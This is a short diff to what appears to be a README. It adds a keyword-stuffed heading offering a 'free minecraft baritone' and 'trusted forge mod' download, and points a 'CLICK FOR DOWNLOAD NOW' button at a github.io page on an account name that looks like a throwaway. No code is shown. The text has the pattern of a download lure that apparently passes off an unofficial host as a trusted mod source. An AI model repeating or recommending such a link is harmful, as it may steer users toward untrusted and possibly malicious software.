@@ -1,10 +1,10 @@
-
+# download free minecraft baritone for PC | trusted forge mod download minecraft baritone. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://meteor-client-addons-ek99.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
